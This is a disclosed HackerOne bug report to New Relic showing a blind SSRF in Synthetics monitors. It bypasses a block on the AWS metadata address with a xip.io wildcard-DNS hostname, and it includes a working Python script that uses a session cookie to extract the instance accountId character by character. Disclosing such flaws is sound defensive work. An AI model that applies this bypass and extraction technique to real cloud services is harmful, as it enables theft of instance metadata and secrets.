@@ -1,0 +1,147 @@
+ReportLink:https://hackerone.com/reports/141304
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/ylujion
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:05.09.2016 7:25:24
+
+Summary:
+ylujion reported to us that it was possible to conduct a blind SSRF attack against Synthetics. This attack could be used to obtain various sensitive data about the server on which the Synthetics monitor is running. The report was particularly clever because access to the IP in question was explicitly blocked by Synthetics - but ylujion also found a way to bypass this block. 
+## Introduction
+
+It was possible to retrieve some data from the `http://169.254.169.254/latest/` URL corresponding to the [amazon instance metadatas](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). With more time, we can dump the whole content.
+
+## PoC
+
+When creating a `Ping Monitor` on the `https://synthetics.newrelic.com/accounts/XXXXXXX/synthetics` URL, it is possible to check if a website is online and match for a string in the retrieved page.
+
+First I tried to create a `Ping Monitor` where the `Monitor URL` is set to `http://169.254.169.254/latest/dynamic/instance-identity/document` to see if we can access to this URL from on of the location available. For the PoC I used the `Dublin, IE` location. When trying this we get the following errors:
+ {F96303}
+
+We are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using [xip.io](http://xip.io/). It does the following as written on the web page:
+```
+What is xip.io?
+xip.io is a magic domain name that provides wildcard DNS
+for any IP address. Say your LAN IP address is 10.0.0.1.
+Using xip.io,
+
+          10.0.0.1.xip.io   resolves to   10.0.0.1
+      www.10.0.0.1.xip.io   resolves to   10.0.0.1
+   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
+  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1
+
+...and so on. You can use these domains to access virtual
+hosts on your development web server from devices on your
+local network, like iPads, iPhones, and other computers.
+No configuration required!
+```
+
+So now we set our `Monitor URL` to `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` and the file is successfully accessed:
+ {F96304}
+
+When looking at [amazons documentation](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html) we know how the `latest/dynamic/instance-identity/document` file is structured:
+```
+{
+  "devpayProductCodes" : null,
+  "availabilityZone" : "us-east-1d",
+  "privateIp" : "10.158.112.84",
+  "version" : "2010-08-31",
+  "region" : "us-east-1",
+  "instanceId" : "i-1234567890abcdef0",
+  "billingProducts" : null,
+  "instanceType" : "t1.micro",
+  "accountId" : "123456789012",
+  "pendingTime" : "2015-11-19T16:32:11Z",
+  "imageId" : "ami-5fb8c835",
+  "kernelId" : "aki-919dcaf8",
+  "ramdiskId" : null,
+  "architecture" : "x86_64"
+}
+```
+
+As a PoC, we are going to retrieve the `accountId` value from the `Dublin, IE` amazon instance. For this purpose the following `python` script was created:
+```
+#!/usr/bin/python3
+import requests
+import json
+import time
+
+#Charset that will be used to determine the accountId
+alpha_min = '0123456789'
+
+#Headers needed for some requests
+headers = {'Accept': 'application/json'}
+headers_put = {'Accept': 'application/json', 'Content-Type' : 'application/json;charset=UTF-8'}
+
+#Session cookie
+cookies = dict(login_service_login_newrelic_com_tokens = '%7B%22token%22%3A%22Y%2BhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry%2FJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D%2FNq6vIL21brVNi%2Fm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA%3D%3D%22%2C%22refresh_token%22%3A%22mCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z%2B%2FMb38cFuMLcR9V0USrvt%2FbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG%2BYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w%3D%3D%22%7D')
+
+#Base URL
+url = 'https://synthetics.newrelic.com'
+
+#URL suffixes of actions that will be used
+latest_monitor = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true&locations=AWS_EU_WEST_1&locations=AWS_US_EAST_1&locations=LINODE_EU_WEST_1&orderBy=timestamp+desc&since=1363517150000&until=1564121950000'
+job = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job'
+change_settings = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json'
+
+#Requesting the current monitor
+r = requests.get(url + latest_monitor, cookies=cookies).json()
+original_id = r[0]['id']
+
+#String that will be filled
+to_find = ''
+
+count = 0
+while(42):
+	r = requests.get(url + latest_monitor, cookies=cookies).json()
+	tmp_id = r[0]['id']
+	print(tmp_id)
+	print(original_id)
+	#If the ID has changed, a new monitor state has arrived
+	if original_id != tmp_id:
+		r = requests.get(url + job.replace('REPLACEME', tmp_id), cookies=cookies, headers=headers).json()
+		print(r['URI'])
+		print(r['status'])
+		#If the status of the monitor is set to SUCCESS, our "Response validation" string is matched and we store the found character and search for a new one
+		if r['status'] == 'SUCCESS':
+			to_find += alpha_min[count - 1]
+			count = 0
+		#We configure our job with a new "Response validation" string
+		original_id = tmp_id
+		uri = "http://accountId\"+:+\"REPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document".replace('REPLACE', alpha_min[count])
+		accountid = "accountId\" : \"" + to_find + "REPLACE".replace('REPLACE', alpha_min[count])
+		x = {"id":"015101be-7318-452a-b210-1e4c443cc0fd","name":"test","accountId":1340503,"userId":1616087,"frequency":1,"uri":uri,"locations":["AWS_EU_WEST_1"],"emails":[],"status":"ENABLED","apiVersion":"0.2.2","slaThreshold":5,"metadata":{"nr.synthetics.metadata.job.options.simple.bypass.head":"true","nr.synthetics.metadata.job.options.response-validation":accountid},"conditions":[],"type":"SIMPLE","permissions":{"monitor/read":"true","monitor/write":"true"},"crc":1899546310,"currentChecks":43200}
+		r = requests.put(url + change_settings, data=json.dumps(x), cookies=cookies, headers=headers_put)
+		print(r.text)
+		count += 1
+	#We sleep for 30 seconds as the jobs are received every 1 minute
+	time.sleep(30)
+```
+
+What we do with this script is:
++ we create a `Response validation` string matching `accountId" : "` on the `Monitor URL` set to  `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` ;
++ we the add a single character to the `Response validation` string from our numeric charset string and wait one minute ;
++ when a new job has been done, we check if the `status` is `FAILURE` or `SUCCESS`. If it is `FAILURE` we try another single character from our numeric charset, if it is `SUCCESS` we matched a new valid character, add it to our `Response validation` string and search for the next character.
++ we do this until our script fails as no more numeric characters are to be found.
+
+By using this string we could determine the value of the `accountId` is `017663287629` in the `latest/dynamic/instance-identity/document` file of the `Dublin, IE` instance.
+
+We could then use the same methodology to dump all files accessible through this URL. For example the `/latest/user-data` file is containing a script. It is also accessible and by checking the same way with the `Response validation` set to `/bin/` was successfully matched through a `monitor`.
+
+## Risks
+
+An attacker would be able to dump all the information contained in the `/latest/` folder of the amazon instance.
+
+## Mitigation
+
++ Do not let it be possible to access the `169.254.169.254` IP address from a monitor.
+
+## Comments
+
+I did not take the time to make a more deeper script that could use multiple `monitors` to communicate between them to dump data faster but it can be done.
+
+I hope I didn't forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.
+
+Regards.
